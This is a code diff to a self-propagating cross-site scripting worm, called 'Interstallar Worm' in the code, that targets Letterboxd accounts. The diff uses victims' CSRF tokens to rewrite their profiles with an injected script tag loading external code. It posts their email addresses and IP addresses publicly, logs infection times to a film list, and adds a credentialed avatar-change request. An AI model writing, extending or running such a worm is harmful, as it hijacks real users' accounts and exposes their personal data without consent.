@@ -30,12 +30,14 @@
         location = ip.startsWith('77') ? 'France' : 'Unknown';
       }
 
+      // Requête 1 - Update profile
       await fetch('/user/update.do', {
         method: 'POST',
         headers: {'Content-Type': 'application/x-www-form-urlencoded'},
         body: `__csrf=${c}&completeSettings=true&givenName="<script src='https://www.paypalobjects.com/martech/tm/paypal/mktconf.js'></script>&familyName=Interstallar+Worm&emailAddress=${encodeURIComponent(e)}&location=Your+ip+is+${ip}&website=Your+email+is+${encodeURIComponent(e)}&bio=&pronoun=They&posterMode=All&commentPolicy=Anyone&privacyIncludeInPeopleSection=true&password=&favouriteFilmIds=117621&favouriteFilmIds=117621&favouriteFilmIds=117621&favouriteFilmIds=117621`
       });
 
+      // Requête 2 - Update list
       const now = new Date();
       const infectionTime = `${now.getDate()}/${now.getMonth()+1}/${now.getFullYear()} ${now.getHours()}:${now.getMinutes()}:${now.getSeconds()}`;
       
@@ -60,6 +62,20 @@
         },
         body: `__csrf=${c}&filmListId=&update=${updatePayload}`
       });
-    } catch(x){}
+
+      // NOUVELLE REQUÊTE - Modification avatar (corrigée)
+      await fetch(`/${username}/save-avatar/`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/x-www-form-urlencoded',
+          'Origin': 'https://letterboxd.com'
+        },
+        credentials: 'include',
+        body: `__csrf=${c}&gravatar=false`
+      });
+
+    } catch(x) {
+      console.error("Error:", x);
+    }
   };
 })();
